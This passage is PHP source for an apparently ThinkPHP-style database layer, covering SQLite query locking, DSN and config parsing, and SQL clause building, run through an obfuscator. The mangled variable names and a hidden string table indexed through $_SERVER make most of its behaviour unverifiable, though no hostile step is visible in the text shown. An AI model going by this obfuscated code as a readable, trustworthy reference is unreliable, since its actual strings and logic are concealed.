extends DbSqlite3Base { public function query($Ê«¯†) { $ãˆ×ÊÃ =& $_SERVER[±³—úê]; if (!CacheLock::fileLock($ãˆ×ÊÃ[13])) { return !1; } $“ôüÓÓÈ = parent::query($Ê«¯†); CacheLock::fileUnLock($ãˆ×ÊÃ[13]); return $“ôüÓÓÈ; } public function execute($û¡ÉÙ¤Š) { $÷«Ãê—û =& $_SERVER[±³—úê]; if (!CacheLock::fileLock($÷«Ãê—û[13])) { return !1; } $ÛæäÌ¤ = parent::execute($û¡ÉÙ¤Š); CacheLock::fileUnLock($÷«Ãê—û[13]); return $ÛæäÌ¤; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\156\x65\161" => "\x3c\76", "\147\164" => "\76", "\145\147\164" => "\76\x3d", "\x6c\x74" => "\x3c", "\x65\x6c\164" => "\x3c\x3d", "\156\157\164\x6c\x69\153\x65" => "\x4e\117\124\x20\114\111\x4b\x45", "\154\x69\153\x65" => "\114\111\x4b\x45", "\151\x6e" => "\x49\x4e", "\x6e\157\x74\151\156" => "\116\117\x54\40\111\x4e", "\156\x6f\x74\x20\x69\x6e" => "\116\117\x54\40\x49\x4e", "\142\x65\x74\167\x65\145\156" => "\102\x45\124\x57\x45\x45\x4e", "\x6e\157\x74\x62\145\x74\167\145\x65\156" => "\x4e\117\124\x20\x42\105\x54\127\105\105\116", "\x6e\157\164\x20\x62\145\164\x77\145\145\x6e" => "\x4e\x4f\124\40\x42\x45\124\127\x45\105\x4e"); protected $selectSql = "\x53\x45\114\x45\103\124\45\x44\x49\123\x54\111\x4e\x43\x54\45\x20\45\x46\111\x45\114\104\x25\40\106\x52\117\115\x20\45\124\101\102\114\x45\45\45\x4a\117\111\116\45\45\x57\x48\x45\x52\x45\45\x25\107\x52\117\x55\120\45\45\x48\101\x56\x49\116\107\x25\45\x4f\122\104\105\x52\x25\x25\114\x49\115\x49\124\x25\40\45\x55\x4e\111\x4f\x4e\x25\x25\x43\117\x4d\115\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $„ŞÃù©Š = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[±³—úê][1039], $„ŞÃù©Š); } public function factory($Ùï§ñïÙ = '') { $ÏŠ…¬Ø· =& $_SERVER[±³—úê]; $Ùï§ñïÙ = $this->parseConfig($Ùï§ñïÙ); if (empty($Ùï§ñïÙ[$ÏŠ…¬Ø·[1040]])) { think_exception(think_lang($ÏŠ…¬Ø·[1041])); } $this->dbType = ucwords(strtolower($Ùï§ñïÙ[$ÏŠ…¬Ø·[1040]])); $Ç¡æ÷ŞÍ = $ÏŠ…¬Ø·[1042] . $this->dbType; if (class_exists($Ç¡æ÷ŞÍ)) { $¯ğ¹ÒÊ” = new $Ç¡æ÷ŞÍ($Ùï§ñïÙ); if ($ÏŠ…¬Ø·[1043] != strtolower($Ùï§ñïÙ[$ÏŠ…¬Ø·[1040]])) { $¯ğ¹ÒÊ”->dbType = strtoupper($this->dbType); } else { $¯ğ¹ÒÊ”->dbType = $this->_getDsnType($Ùï§ñïÙ[$ÏŠ…¬Ø·[995]]); } } else { think_exception(think_lang($ÏŠ…¬Ø·[1044]) . $ÏŠ…¬Ø·[1045] . $Ç¡æ÷ŞÍ); } return $¯ğ¹ÒÊ”; } public function __call($Ù¬ºèÊ, $›çúñ—‘) { if (method_exists($this, $Ù¬ºèÊ)) { return call_user_func_array(array($this, $Ù¬ºèÊ), $›çúñ—‘); } } protected function _getDsnType($©åÍÊ­”) { $òÖâÛ¡– = explode($_SERVER[±³—úê][4], $©åÍÊ­”); $ÏËö®›É = strtoupper(trim($òÖâÛ¡–[0])); return $ÏËö®›É; } private function parseConfig($Ôùıù‡ = '') { $ú¾Ï—ƒ‡ =& $_SERVER[±³—úê]; if (!empty($Ôùıù‡) && is_string($Ôùıù‡)) { $Ôùıù‡ = $this->parseDSN($Ôùıù‡); } elseif (is_array($Ôùıù‡)) { $Ôùıù‡ = array_change_key_case($Ôùıù‡); $Ôùıù‡ = array($ú¾Ï—ƒ‡[1040] => $Ôùıù‡[$ú¾Ï—ƒ‡[1046]], $ú¾Ï—ƒ‡[967] => $Ôùıù‡[$ú¾Ï—ƒ‡[1047]], $ú¾Ï—ƒ‡[968] => $Ôùıù‡[$ú¾Ï—ƒ‡[1048]], $ú¾Ï—ƒ‡[965] => $Ôùıù‡[$ú¾Ï—ƒ‡[1049]], $ú¾Ï—ƒ‡[966] => $Ôùıù‡[$ú¾Ï—ƒ‡[1050]], $ú¾Ï—ƒ‡[21] => $Ôùıù‡[$ú¾Ï—ƒ‡[1051]], $ú¾Ï—ƒ‡[995] => $Ôùıù‡[$ú¾Ï—ƒ‡[1052]], $ú¾Ï—ƒ‡[17] => isset($Ôùıù‡[$ú¾Ï—ƒ‡[1053]]) ? $Ôùıù‡[$ú¾Ï—ƒ‡[1053]] : array()); } elseif (empty($Ôùıù‡)) { if (think_config($ú¾Ï—ƒ‡[1054]) && $ú¾Ï—ƒ‡[1043] != strtolower(think_config($ú¾Ï—ƒ‡[1055]))) { $Ôùıù‡ = $this->parseDSN(think_config($ú¾Ï—ƒ‡[1054])); } else { $Ôùıù‡ = array($ú¾Ï—ƒ‡[1040] => think_config($ú¾Ï—ƒ‡[1055]), $ú¾Ï—ƒ‡[967] => think_config($ú¾Ï—ƒ‡[1056]), $ú¾Ï—ƒ‡[968] => think_config($ú¾Ï—ƒ‡[1057]), $ú¾Ï—ƒ‡[965] => think_config($ú¾Ï—ƒ‡[1058]), $ú¾Ï—ƒ‡[966] => think_config($ú¾Ï—ƒ‡[1059]), $ú¾Ï—ƒ‡[21] => think_config($ú¾Ï—ƒ‡[334]), $ú¾Ï—ƒ‡[995] => think_config($ú¾Ï—ƒ‡[1054]), $ú¾Ï—ƒ‡[17] => think_config($ú¾Ï—ƒ‡[1060])); } } return $Ôùıù‡; } protected function initConnect($´…ı…€» = true) { if (1 == think_config($_SERVER[±³—úê][22])) { $this->_linkID = $this->multiConnect($´…ı…€»); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ı‹©Ñ¯± => $Ãõ€¶†Œ) { $this->_linkID = $Ãõ€¶†Œ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($öãÄŒ×ñ = false) { $§¬½†Ûˆ =& $_SERVER[±³—úê]; static $ÑŸƒ‹³À = array(); static $™µò¢ïÈ = -1; if (empty($ÑŸƒ‹³À)) { foreach ($this->config as $¬Ñ§Ö“¢ => $î™éÈ Ä) { $ÑŸƒ‹³À[$¬Ñ§Ö“¢] = explode($§¬½†Ûˆ[50], $î™éÈ Ä); } } if (think_config($§¬½†Ûˆ[1061])) { if ($öãÄŒ×ñ || think_config($§¬½†Ûˆ[482]) === !0) { $«É’¢À = floor(mt_rand(0, think_config($§¬½†Ûˆ[1062]) - 1)); $™µò¢ïÈ = $«É’¢À; } else { if (is_numeric(think_config($§¬½†Ûˆ[1063]))) { $«É’¢À = think_config($§¬½†Ûˆ[1063]); } else { $«É’¢À = floor(mt_rand(think_config($§¬½†Ûˆ[1062]), count($ÑŸƒ‹³À[$§¬½†Ûˆ[965]]) - 1)); } } } else { $«É’¢À = floor(mt_rand(0, count($ÑŸƒ‹³À[$§¬½†Ûˆ[965]]) - 1)); $™µò¢ïÈ = $«É’¢À; } $«É’¢À = $™µò¢ïÈ !== -1 ? $™µò¢ïÈ : $«É’¢À; $–Òø¤ = array($§¬½†Ûˆ[967] => isset($ÑŸƒ‹³À[$§¬½†Ûˆ[967]][$«É’¢À]) ? $ÑŸƒ‹³À[$§¬½†Ûˆ[967]][$«É’¢À] : $ÑŸƒ‹³À[$§¬½†Ûˆ[967]][0], $§¬½†Ûˆ[968] => isset($ÑŸƒ‹³À[$§¬½†Ûˆ[968]][$«É’¢À]) ? $ÑŸƒ‹³À[$§¬½†Ûˆ[968]][$«É’¢À] : $ÑŸƒ‹³À[$§¬½†Ûˆ[968]][0], $§¬½†Ûˆ[965] => isset($ÑŸƒ‹³À[$§¬½†Ûˆ[965]][$«É’¢À]) ? $ÑŸƒ‹³À[$§¬½†Ûˆ[965]][$«É’¢À] : $ÑŸƒ‹³À[$§¬½†Ûˆ[965]][0], $§¬½†Ûˆ[966] => isset($ÑŸƒ‹³À[$§¬½†Ûˆ[966]][$«É’¢À]) ? $ÑŸƒ‹³À[$§¬½†Ûˆ[966]][$«É’¢À] : $ÑŸƒ‹³À[$§¬½†Ûˆ[966]][0], $§¬½†Ûˆ[21] => isset($ÑŸƒ‹³À[$§¬½†Ûˆ[21]][$«É’¢À]) ? $ÑŸƒ‹³À[$§¬½†Ûˆ[21]][$«É’¢À] : $ÑŸƒ‹³À[$§¬½†Ûˆ[21]][0], $§¬½†Ûˆ[995] => isset($ÑŸƒ‹³À[$§¬½†Ûˆ[995]][$«É’¢À]) ? $ÑŸƒ‹³À[$§¬½†Ûˆ[995]][$«É’¢À] : $ÑŸƒ‹³À[$§¬½†Ûˆ[995]][0], $§¬½†Ûˆ[17] => isset($ÑŸƒ‹³À[$§¬½†Ûˆ[17]][$«É’¢À]) ? $ÑŸƒ‹³À[$§¬½†Ûˆ[17]][$«É’¢À] : $ÑŸƒ‹³À[$§¬½†Ûˆ[17]][0]); return $this->connect($–Òø¤, $«É’¢À); } public function parseDSN($£«Á“) { $ÍÂ¬€ÀÑ =& $_SERVER[±³—úê]; if (empty($£«Á“)) { return !1; } $ÜÎ’¬óÒ = parse_url($£«Á“); if ($ÜÎ’¬óÒ[$ÍÂ¬€ÀÑ[207]]) { $óø¢ÌÃ = array($ÍÂ¬€ÀÑ[1040] => $ÜÎ’¬óÒ[$ÍÂ¬€ÀÑ[207]], $ÍÂ¬€ÀÑ[967] => isset($ÜÎ’¬óÒ[$ÍÂ¬€ÀÑ[676]]) ? $ÜÎ’¬óÒ[$ÍÂ¬€ÀÑ[676]] : $ÍÂ¬€ÀÑ[12], $ÍÂ¬€ÀÑ[968] => isset($ÜÎ’¬óÒ[$ÍÂ¬€ÀÑ[1064]]) ? $ÜÎ’¬óÒ[$ÍÂ¬€ÀÑ[1064]] : $ÍÂ¬€ÀÑ[12], $ÍÂ¬€ÀÑ[965] => isset($ÜÎ’¬óÒ[$ÍÂ¬€ÀÑ[208]]) ? $ÜÎ’¬óÒ[$ÍÂ¬€ÀÑ[208]] : $ÍÂ¬€ÀÑ[12], $ÍÂ¬€ÀÑ[966] => isset($ÜÎ’¬óÒ[$ÍÂ¬€ÀÑ[209]]) ? $ÜÎ’¬óÒ[$ÍÂ¬€ÀÑ[209]] : $ÍÂ¬€ÀÑ[12], $ÍÂ¬€ÀÑ[21] => isset($ÜÎ’¬óÒ[$ÍÂ¬€ÀÑ[87]]) ? substr($ÜÎ’¬óÒ[$ÍÂ¬€ÀÑ[87]], 1) : $ÍÂ¬€ÀÑ[12]); } else { preg_match($ÍÂ¬€ÀÑ[1065], trim($£«Á“), $øËÎÏ§‡); $óø¢ÌÃ = array($ÍÂ¬€ÀÑ[1040] => $øËÎÏ§‡[1], $ÍÂ¬€ÀÑ[967] => $øËÎÏ§‡[2], $ÍÂ¬€ÀÑ[968] => $øËÎÏ§‡[3], $ÍÂ¬€ÀÑ[965] => $øËÎÏ§‡[4], $ÍÂ¬€ÀÑ[966] => $øËÎÏ§‡[5], $ÍÂ¬€ÀÑ[21] => $øËÎÏ§‡[6]); } $óø¢ÌÃ[$ÍÂ¬€ÀÑ[995]] = $ÍÂ¬€ÀÑ[12]; return $óø¢ÌÃ; } protected function debug() { $âÅß›ú„ =& $_SERVER[±³—úê]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $âÅß›ú„[1066]; if (think_config($âÅß›ú„[1067])) { think_status($âÅß›ú„[1068]); think_trace($this->queryStr . $âÅß›ú„[1069] . think_status($âÅß›ú„[24], $âÅß›ú„[1068], 6) . $âÅß›ú„[1070], $âÅß›ú„[12], $âÅß›ú„[1071]); } } protected function parseLock($Íê›Ò—› = false) { $ºåÍÀÖ­ =& $_SERVER[±³—úê]; if (!$Íê›Ò—›) { return $ºåÍÀÖ­[12]; } if ($ºåÍÀÖ­[997] == $this->dbType) { return $ºåÍÀÖ­[1072]; } return $ºåÍÀÖ­[1073]; } protected function parseSet($Ï‚ø¥ô…) { $¦®Œ‡êú =& $_SERVER[±³—úê]; foreach ($Ï‚ø¥ô… as $¸Åˆ›ï» => $½øŸàãÇ) { if (is_array($½øŸàãÇ) && $¦®Œ‡êú[383] == $½øŸàãÇ[0]) { $¸¸«ãÜ›[] = $this->parseKey($¸Åˆ›ï») . $¦®Œ‡êú[517] . $½øŸàãÇ[1]; } elseif (is_scalar($½øŸàãÇ) || is_null($½øŸàãÇ)) { $¸¸«ãÜ›[] = $this->parseKey($¸Åˆ›ï») . $¦®Œ‡êú[517] . $this->parseValue($½øŸàãÇ); } } return $¦®Œ‡êú[1074] . implode($¦®Œ‡êú[50], $¸¸«ãÜ›); } protected function bindParam($ª€Ìâöª, $øÖîø»¢) { $this->bind[$_SERVER[±³—úê][4] . $ª€Ìâöª] = $øÖîø»¢; } protected function parseBind($¨ËÙ›„) { $¨ËÙ›„ = array_merge($this->bind, $¨ËÙ›„); $this->bind = array(); return $¨ËÙ›„; } function parseKey(&$­â¢ñÍö, $›Íæ†í = true) { if ($›Íæ†í) { $­â¢ñÍö = $this->parseKeyCheck($­â¢ñÍö); } return $­â¢ñÍö; } function parseKeyCheck($ÊµÉ˜Î) { $²«³©ù¢ =& $_SERVER[±³—úê]; $ÊµÉ˜Î = trim($ÊµÉ˜Î); if (!preg_match($²«³©ù¢[1075], $ÊµÉ˜Î)) { think_exception($²«³©ù¢[1076] . $ÊµÉ˜Î); } return $ÊµÉ˜Î; } protected function parseValue($•ŒÕõ…ü) { $ïœ¾•šé =& $_SERVER[±³—úê]; if (is_string($•ŒÕõ…ü)) { $•ŒÕõ…ü = $ïœ¾•šé[1036] . $this->escapeString($•ŒÕõ…ü) . $ïœ¾•šé[1036]; } elseif (isset($•ŒÕõ…ü[0]) && is_string($•ŒÕõ…ü[0]) && strtolower($•ŒÕõ…ü[0]) == $ïœ¾•šé[383]) { $•ŒÕõ…ü = $this->escapeString($•ŒÕõ…ü[1]); } elseif (is_array($•ŒÕõ…ü)) { $•ŒÕõ…ü = array_map(array($this, $ïœ¾•šé[1037]), $•ŒÕõ…ü); } elseif (is_bool($•ŒÕõ…ü)) { $•ŒÕõ…ü = $•ŒÕõ…ü ? $ïœ¾•šé[91] : $ïœ¾•šé[240]; } elseif (is_null($•ŒÕõ…ü)) { $•ŒÕõ…ü = $ïœ¾•šé[106]; } return $•ŒÕõ…ü; } protected function parseField($²ßÊĞ¡) { $µùü¨ú =& $_SERVER[±³—úê]; if (is_string($²ßÊĞ¡) && strpos($²ßÊĞ¡, $µùü¨ú[50])) { $²ßÊĞ¡ = explode($µùü¨ú[50], $²ßÊĞ¡); } if (is_array($²ßÊĞ¡)) { $«ÄË¡¸– = array(); foreach ($²ßÊĞ¡ as $´É²¥Ú => $Ë©Ë»á–) { if (!is_numeric($´É²¥Ú)) { $«ÄË¡¸–[] = $this->parseKey($´É²¥Ú, !1) . $µùü¨ú[1077] . $this->parseKey($Ë©Ë»á–); } else { $«ÄË¡¸–[] = $this->parseKey($Ë©Ë»á–); } } $¥ùã‘ = implode($µùü¨ú[50], $«ÄË¡¸–); } elseif (is_string($²ßÊĞ¡) && !empty($²ßÊĞ¡)) { $¥ùã‘ = $²ßÊĞ¡; } else { $¥ùã‘ = $µùü¨ú[232]; } return $¥ùã‘; } protected function parseTable($…áå©”) { $¼¬İäè£ =& $_SERVER[±³—úê]; if (is_array($…áå©”)) { $úïğ¢† = array(); foreach ($…áå©” as $İèÜÜÙû => $…¯ÁÓ¶¨) { if (!is_numeric($İèÜÜÙû)) { $úïğ¢†[] = $this->parseKey($İèÜÜÙû) . $¼¬İäè£[53] . $this->parseKey($…¯ÁÓ¶¨); } else { $úïğ¢†[] = $this->parseKey($İèÜÜÙû); } } $…áå©” = $úïğ¢†; } elseif (is_string($…áå©”)) { if (strstr($…áå©”, $¼¬İäè£[53])) { return $…áå©”; } $…áå©” = explode($¼¬İäè£[50], $…áå©”); array_walk($…áå©”, array($this, $¼¬İäè£[985])); } return $¼¬İäè£[979] . trim(implode($¼¬İäè£[1078], $…áå©”), $¼¬İäè£[472]) . $¼¬İäè£[979]; } protected function parseWhere($­’æá·§) { $üŞƒÈé€ =& $_SERVER[±³—úê]; $±š¦ú„¨ = $üŞƒÈé€[12]; if (is_string($­’æá·§)) { $±š¦ú„¨ = $­’æá·§; } else { $›õ½şÁ = isset($­’æá·§[$üŞƒÈé€[1079]]) ? strtoupper($­’æá·§[$üŞƒÈé€[1079]]) : $üŞƒÈé€[12]; if (in_array($›õ½şÁ, array($üŞƒÈé€[1080], $üŞƒÈé€[1081], $üŞƒÈé€[1082]))) { $›õ½şÁ = $üŞƒÈé€[53] . $›õ½şÁ . $üŞƒÈé€[53]; unset($­’æá·§[$üŞƒÈé€[1079]]); } else { $›õ½şÁ = $üŞƒÈé€[1083]; } foreach ($­’æá·§ as $±¥ò°íÚ => $… õÁ›ó) { $±š¦ú„¨ .= $üŞƒÈé€[365]; if (is_numeric($±¥ò°íÚ)) { $±¥ò°íÚ = $üŞƒÈé€[1084]; } if (0 === strpos($±¥ò°íÚ, $üŞƒÈé€[11])) { $±š¦ú„¨ .= $this->parseThinkWhere($±¥ò°íÚ, $… õÁ›ó); } else { if (!preg_match($üŞƒÈé€[1085], trim($±¥ò°íÚ))) { think_exception(think_lang($üŞƒÈé€[1086]) . $üŞƒÈé€[4] . $±¥ò°íÚ); } $Â×Ö£«ï = is_array($… õÁ›ó) && isset($… õÁ›ó[$üŞƒÈé€[1087]]); $±¥ò°íÚ = trim($±¥ò°íÚ); if (strpos($±¥ò°íÚ, $üŞƒÈé€[214])) { $–Â´ï·Ì = explode($üŞƒÈé€[214], $±¥ò°íÚ); $ÅĞ÷Øæß = array(); foreach ($–Â´ï·Ì as $šª² ·« => $Ï§ÅğÅ) { $µÔãÙñ = $Â×Ö£«ï ? $… õÁ›ó[$šª² ·«] : $… õÁ›ó; $ÅĞ÷Øæß[] = $üŞƒÈé€[348] . $this->parseWhereItem($this->parseKey($Ï§ÅğÅ), $µÔãÙñ) . $üŞƒÈé€[984]; } $±š¦ú„¨ .= implode($üŞƒÈé€[1088], $ÅĞ÷Øæß); } elseif (strpos($±¥ò°íÚ, $üŞƒÈé€[296])) { $–Â´ï·Ì = explode($üŞƒÈé€[296], $±¥ò°íÚ); $ÅĞ÷Øæß = array(); foreach ($–Â´ï·Ì as $šª² ·« => $Ï§ÅğÅ) { $µÔãÙñ = $Â×Ö£«ï ? $… õÁ›ó[$šª² ·«] : $… õÁ›ó; $ÅĞ÷Øæß[] = $üŞƒÈé€[348] . $this->parseWhereItem($this->parseKey($Ï§ÅğÅ), $µÔãÙñ) . $üŞƒÈé€[984]; } $±š¦ú„¨ .= implode($üŞƒÈé€[1083], $ÅĞ÷Øæß); } else { $±š¦ú„¨ .= $this->parseWhereItem($this->parseKey($±¥ò°íÚ), $… õÁ›ó); } } $±š¦ú„¨ .= $üŞƒÈé€[366] . $›õ½şÁ; } $±š¦ú„¨ = substr($±š¦ú„¨, 0, -strlen($›õ½şÁ)); } return empty($±š¦ú„¨) ? $üŞƒÈé€[12] : $üŞƒÈé€[1089] . $±š¦ú„¨; } protected function parseWhereItem($±¸À‘éÑ, $Í„Ä†Š­) { $âº·ÁÑÚ =& $_SERVER[±³—úê]; $¶ÓµáŸÇ = $âº·ÁÑÚ[12]; if (is_array($Í„Ä†Š­)) { if (is_string($Í„Ä†Š­[0])) { $·†ö—±› = strtolower($Í„Ä†Š­[0]); if (in_array($Í„Ä†Š­[0], array($âº·ÁÑÚ[517], $âº·ÁÑÚ[1090], $âº·ÁÑÚ[1091], $âº·ÁÑÚ[1092], $âº·ÁÑÚ[1093], $âº·ÁÑÚ[1094]))) { $¶ÓµáŸÇ .= $±¸À‘éÑ . $âº·ÁÑÚ[53] . $Í„Ä†Š­[0] . $âº·ÁÑÚ[53] . $this->parseValue($Í„Ä†Š­[1]); } elseif (preg_match($âº·ÁÑÚ[1095], $Í„Ä†Š­[0])) { $¶ÓµáŸÇ .= $±¸À‘éÑ . $âº·ÁÑÚ[53] . $this->exp[$·†ö—±›] . $âº·ÁÑÚ[53] . $this->parseValue($Í„Ä†Š­[1]); } elseif (preg_match($âº·ÁÑÚ[1096], $Í„Ä†Š­[0])) { if (is_array($Í„Ä†Š­[1])) { $¿‰®×öŞ = isset($Í„Ä†Š­[2]) ? strtoupper($Í„Ä†Š­[2]) : $âº·ÁÑÚ[1081]; if (in_array($¿‰®×öŞ, array($âº·ÁÑÚ[1080], $âº·ÁÑÚ[1081], $âº·ÁÑÚ[1082]))) { $³Äë¤– = array(); foreach ($Í„Ä†Š­[1] as $µÌñÔÇ) { $³Äë¤–[] = $±¸À‘éÑ . $âº·ÁÑÚ[53] . $this->exp[$·†ö—±›] . $âº·ÁÑÚ[53] . $this->parseValue($µÌñÔÇ); } $¶ÓµáŸÇ .= $âº·ÁÑÚ[348] . implode($âº·ÁÑÚ[53] . $¿‰®×öŞ . $âº·ÁÑÚ[53], $³Äë¤–) . $âº·ÁÑÚ[984]; } } else { $¶ÓµáŸÇ .= $±¸À‘éÑ . $âº·ÁÑÚ[53] . $this->exp[$·†ö—±›] . $âº·ÁÑÚ[53] . $this->parseValue($Í„Ä†Š­[1]); } } elseif ($âº·ÁÑÚ[383] == $·†ö—±›) { $¶ÓµáŸÇ .= $âº·ÁÑÚ[982] . $±¸À‘éÑ . $âº·ÁÑÚ[53] . $Í„Ä†Š­[1] . $âº·ÁÑÚ[1097]; } elseif (preg_match($âº·ÁÑÚ[1098], $Í„Ä†Š­[0])) { $¶ÓµáŸÇ .= $Í„Ä†Š­[0]; } elseif (preg_match($âº·ÁÑÚ[1099], $Í„Ä†Š­[0])) { if (isset($Í„Ä†Š­[2]) && $âº·ÁÑÚ[383] == $Í„Ä†Š­[2]) { $¶ÓµáŸÇ .= $±¸À‘éÑ . $âº·ÁÑÚ[53] . $this->exp[$·†ö—±›] . $âº·ÁÑÚ[53] . $Í„Ä†Š­[1]; } else { if (is_string($Í„Ä†Š­[1])) { $Í„Ä†Š­[1] = explode($âº·ÁÑÚ[50], $Í„Ä†Š­[1]); } $ıÃ¼÷íµ = implode($âº·ÁÑÚ[50], $this->parseValue($Í„Ä†Š­[1])); $¶ÓµáŸÇ .= $±¸À‘éÑ . $âº·ÁÑÚ[53] . $this->exp[$·†ö—±›] . $âº·ÁÑÚ[982] . $ıÃ¼÷íµ . $âº·ÁÑÚ[984]; } } elseif (preg_match($âº·ÁÑÚ[1100], $Í„Ä†Š­[0])) { $¬‡©¨› = is_string($Í„Ä†Š­[1]) ? explode($âº·ÁÑÚ[50], $Í„Ä†Š­[1]) : $Í„Ä†Š­[1]; $¶ÓµáŸÇ .= $âº·ÁÑÚ[982] . $±¸À‘éÑ . $âº·ÁÑÚ[53] . $this->exp[$·†ö—±›] . $âº·ÁÑÚ[53] . $this->parseValue($¬‡©¨›[0]) . $âº·ÁÑÚ[1083] . $this->parseValue($¬‡©¨›[1]) . $âº·ÁÑÚ[366]; } else { think_exception(think_lang($âº·ÁÑÚ[1086]) . $âº·ÁÑÚ[4] . $Í„Ä†Š­[0]); } } else { $ ƒÇ§îç = count($Í„Ä†Š­); $øóÆÍØ› = $âº·ÁÑÚ[12]; if (is_string($Í„Ä†Š­[$ ƒÇ§îç - 1])) { $øóÆÍØ› = isset($Í„Ä†Š­[$ ƒÇ§îç - 1]) ? strtoupper($Í„Ä†Š­[$ ƒÇ§îç - 1]) : $âº·ÁÑÚ[12]; if (in_array($øóÆÍØ›, array($âº·ÁÑÚ[1080], $âº·ÁÑÚ[1081], $âº·ÁÑÚ[1082]))) { $ ƒÇ§îç = $ ƒÇ§îç - 1; } } else { $øóÆÍØ› = $âº·ÁÑÚ[1080]; } for ($¾¬´¥Ì = 0; $¾¬´¥Ì < $ ƒÇ§îç; $¾¬´¥Ì++) { $¬‡©¨› = is_array($Í„Ä†Š­[$¾¬´¥Ì]) ? $Í„Ä†Š­[$¾¬´¥Ì][1] : $Í„Ä†Š­[$¾¬´¥Ì]; if ($âº·ÁÑÚ[383] == strtolower($Í„Ä†Š­[$¾¬´¥Ì][0])) { $¶ÓµáŸÇ .= $âº·ÁÑÚ[348] . $±¸À‘éÑ . $âº·ÁÑÚ[53] . $¬‡©¨› . $âº·ÁÑÚ[1097] . $øóÆÍØ› . $âº·ÁÑÚ[53]; } else { $Å‚öİ‘µ = is_array($Í„Ä†Š­[$¾¬´¥Ì]) ? $this->exp[strtolower($Í„Ä†Š­[$¾¬´¥Ì][0])] : $âº·ÁÑÚ[517]; if (!$Å‚öİ‘µ && is_array($Í„Ä†Š­[$¾¬´¥Ì]) && in_array($Í„Ä†Š­[$¾¬´¥Ì][0], array($âº·ÁÑÚ[517], $âº·ÁÑÚ[1090], $âº·ÁÑÚ[1091], $âº·ÁÑÚ[1092], $âº·ÁÑÚ[1093], $âº·ÁÑÚ[1094]))) { $Å‚öİ‘µ = $Í„Ä†Š­[$¾¬´¥Ì][0]; } $¶ÓµáŸÇ .= $âº·ÁÑÚ[348] . $±¸À‘éÑ . $âº·ÁÑÚ[53] . $Å‚öİ‘µ . $âº·ÁÑÚ[53] . $this->parseValue($¬‡©¨›) . $âº·ÁÑÚ[1097] . $øóÆÍØ› . $âº·ÁÑÚ[53]; } } $¶ÓµáŸÇ = substr($¶ÓµáŸÇ, 0, -4); } } else { $¶ÓµáŸÇ .= $±¸À‘éÑ . $âº·ÁÑÚ[1101] . $this->parseValue($Í„Ä†Š­); } return $¶ÓµáŸÇ; } protected function parseThinkWhere($°´éÙİ, $‡™ó±ò) { $ÖˆßÜŞà =& $_SERVER[±³—úê]; $ÄŒŒ„‰ = $ÖˆßÜŞà[12]; switch ($°´éÙİ) { case $ÖˆßÜŞà[438]: $ÄŒŒ„‰ = $‡™ó±ò; break; case $ÖˆßÜŞà[1084]: $ÄŒŒ„‰ = is_string($‡™ó±ò) ? $‡™ó±ò : substr($this->parseWhere($‡™ó±ò), 6); break; case $ÖˆßÜŞà[1102]: parse_str($‡™ó±ò, $÷¢ÑÚ„); if (isset($÷¢ÑÚ„[$ÖˆßÜŞà[1079]])) { $Ø›úõÂë = $ÖˆßÜŞà[53] . strtoupper($÷¢ÑÚ„[$ÖˆßÜŞà[1079]]) . $ÖˆßÜŞà[53]; unset($÷¢ÑÚ„[$ÖˆßÜŞà[1079]]); } else { $Ø›úõÂë = $ÖˆßÜŞà[1083]; } $ë£ŠÉ¤å = array(); foreach ($÷¢ÑÚ„ as $ „•¯¼“ => $¸½øÀ–å) { $ë£ŠÉ¤å[] = $this->parseKey($ „•¯¼“) . $ÖˆßÜŞà[1101] . $this->parseValue($¸½øÀ–å); } $ÄŒŒ„‰ = implode($Ø›úõÂë, $ë£ŠÉ¤å); break; } return $ÄŒŒ„‰; } protected function parseLimit($î×¶ı¨) { $ÆâÜõú‚ =& $_SERVER[±³—úê]; return !empty($î×¶ı¨) ? $ÆâÜõú‚[51] . $î×¶ı¨ . $ÆâÜõú‚[53] : $ÆâÜõú‚[12]; } protected function parseJoin($˜ŞÁ§Ëå) { $ÆÄíçïŞ =& $_SERVER[±³—úê]; $æï²¢ß‰ = $ÆÄíçïŞ[12]; if (!empty($˜ŞÁ§Ëå)) { if (is_array($˜ŞÁ§Ëå)) { foreach ($˜ŞÁ§Ëå as $Áö•ÛîÍ => $†ºƒ¤¸ó) { if (!1 !== stripos($†ºƒ¤¸ó, $ÆÄíçïŞ[1103])) { $æï²¢ß‰ .= $ÆÄíçïŞ[53] . $†ºƒ¤¸ó; } else { $æï²¢ß‰ .= $ÆÄíçïŞ[1104] . $†ºƒ¤¸ó; } } } else { $æï²¢ß‰ .= $ÆÄíçïŞ[1104] . $˜ŞÁ§Ëå; } } $æï²¢ß‰ = preg_replace($ÆÄíçïŞ[1105], think_config($ÆÄíçïŞ[1009]) . $ÆÄíçïŞ[1106], $æï²¢ß‰); return $æï²¢ß‰; } protected function parseOrder($š‰Œèõ£) { $õûªçÎÊ =& $_SERVER[±³—úê]; if (is_array($š‰Œèõ£)) { $Åì©œÏÁ = array(); foreach ($š‰Œèõ£ as $®Û°Àğİ => $ì³²È¦ê) { if (is_numeric($®Û°Àğİ)) { $Åì©œÏÁ[] = $this->parseKey($ì³²È¦ê); } else { $ì³²È¦ê = in_array(strtoupper(trim($ì³²È¦ê)), array($õûªçÎÊ[1107], $õûªçÎÊ[1108])) ? $õûªçÎÊ[53] . $ì³²È¦ê : $õûªçÎÊ[12]; if (preg_match($õûªçÎÊ[1109], $®Û°Àğİ)) { $Åì©œÏÁ[] = $this->parseKey($®Û°Àğİ) . $ì³²È¦ê; } else { think_exception($õûªçÎÊ[1110] . $®Û°Àğİ); } } } $š‰Œèõ£ = implode($õûªçÎÊ[50], $Åì©œÏÁ); } return !empty($š‰Œèõ£) ? $õûªçÎÊ[1111] . $š‰Œèõ£ : $õûªçÎÊ[12]; } protected function parseGroup($Çï¢¨é») { 